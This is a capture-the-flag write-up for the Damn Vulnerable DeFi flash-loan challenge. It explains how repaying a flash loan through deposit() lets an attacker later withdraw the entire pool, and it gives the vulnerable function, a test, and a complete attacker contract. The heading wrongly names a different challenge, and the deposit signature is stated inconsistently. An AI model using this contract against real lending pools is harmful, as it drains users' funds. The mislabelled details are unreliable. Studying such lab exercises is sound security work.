Prepared by: [Elia Bordoni](https://elia-bordoni-blockchain-dev.netlify.app/)

### Damn Vulnerable DeFi: Unstoppable

**Exercise** A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system. You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

## Protocol Allows Flash Loan Ether to Be Deposited and Marked as Repaid, Enabling Subsequent Unauthorized Withdrawals

**Description** The protocol allows users to take flash loans and ensures repayment by comparing the current balance of the contract with the balanceBefore value recorded at the beginning of the operation. However, the protocol also provides `SideEntranceLenderPool::deposit(uint256 _amount)` that updates the balances mapping. If, within the flash loan callback, instead of repaying the borrowed funds via a direct call, the borrower calls `SideEntranceLenderPool::deposit(uint256 _amount)` to return the Ether, the final repayment check will still pass successfully. This is because the Ether is indeed present in the contract’s balance, even though it has been credited to the attacker’s account in the balances mapping.
As a result, the flash loan transaction completes without reverting, but the attacker retains a non-zero balances entry. After the transaction, the attacker can call `SideEntranceLenderPool::withdraw()` to drain the funds, effectively stealing all the deposited Ether.

<details>
<summary>vulnerability</summary>

```solidity
    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

@>      if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```

</details>

**Impact** An attacker can borrow the contract’s entire Ether balance through a flash loan, repay it using `SideEntranceLenderPool::deposit(uint256 _amount)`, and subsequently call `SideEntranceLenderPool::withdraw()` to steal all the funds. This results in a complete and permanent loss of all Ether held by the contract.

**ProofOfConcept** Add the code into the test file `SideEntrance.t.sol` to deploy the attacker contract. Then create AttackerContract.sol and copy the attacker codebase into it. Run the test to confirm it passes successfully: within a single transaction the flash loan is requested and “repaid” by calling deposit, and then the attacker contract calls withdraw and forwards the received funds to the destination address.

<details>
<summary>Test Code</summary>

```solidity
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        AttackerContract attacker = new AttackerContract(address(pool), recovery);
        attacker.attack();
    }
```

</details>

<details>
<summary>Attacker Contract Code</summary>

```solidity
   // SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;
import "forge-std/Test.sol";

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}

contract AttackerContract {
    ISideEntranceLenderPool private pool;
    address private owner;
    address private recovery;

    constructor(address _poolAddress, address _recoveryAddress) {
        pool = ISideEntranceLenderPool(_poolAddress);
        owner = msg.sender;
        recovery = _recoveryAddress;
    }

    function attack() external {
        require(msg.sender == owner, "Only owner can attack");
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        (bool success,)= recovery.call{value: msg.value}("");
        require(success, "Transfer to recovery failed");
    }
}
```

</details>
